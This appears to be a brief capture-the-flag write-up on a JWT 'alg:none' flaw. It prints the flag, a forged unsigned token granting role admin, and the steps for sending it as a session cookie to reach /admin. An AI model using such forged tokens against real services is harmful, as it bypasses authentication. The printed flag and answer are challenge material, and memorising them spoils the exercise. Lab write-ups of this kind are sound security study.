**Flag:** `bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}`

**TL;DR** Session cookie is a JWT (HS256, `{"user":"guest","role":"user"}`). Server accepts `alg:none` → forge `role:admin`, unsigned.

**Find** POST /login (username only, no password) sets `session=<JWT>`. `/admin` returns 403 for role `user`. Decode payload → role check.

**Solve** Craft `{"alg":"none","typ":"JWT"}` . `{"user":"admin","role":"admin"}` . `` (empty sig):
`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.`
Send as `session` cookie to /admin → 200, flag in `.flag` div. Server verified.
